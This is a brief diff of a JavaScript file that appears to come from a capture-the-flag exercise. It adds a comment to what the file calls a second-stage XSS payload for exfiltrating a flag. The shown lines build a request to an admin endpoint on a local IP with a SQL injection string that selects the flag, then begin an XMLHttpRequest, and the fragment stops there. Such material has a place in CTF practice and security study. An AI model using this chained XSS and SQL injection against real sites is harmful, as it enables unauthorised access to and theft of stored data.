@@ -1,3 +1,4 @@
+// Not an automated test. Just a reference.
 // 2nd stage XSS payload to exfiltrate flag
 url = "http://192.168.1.159:5000/admin/view/"+encodeURIComponent("0 union select 1,(select flag from flag),3,4,5")
 var xmlhttp = new XMLHttpRequest();
